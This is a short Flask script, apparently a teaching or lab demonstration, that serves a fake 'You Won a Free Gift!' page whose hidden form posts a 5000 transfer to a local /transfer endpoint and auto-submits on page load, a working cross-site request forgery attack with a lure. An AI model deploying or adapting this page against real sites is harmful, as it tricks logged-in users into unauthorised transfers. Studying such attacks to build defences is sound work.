from flask import Flask

app = Flask(__name__)

@app.route("/")
def attack():
    return """
    <h2>🎁 You Won a Free Gift!</h2>

    <form action="http://127.0.0.1:5000/transfer" method="POST">
        <input type="hidden" name="amount" value="5000">
        <input type="submit" value="Click to Claim Prize">
    </form>

    <script>
        document.forms[0].submit();
    </script>
    """

if __name__ == "__main__":
    app.run(port=8000)
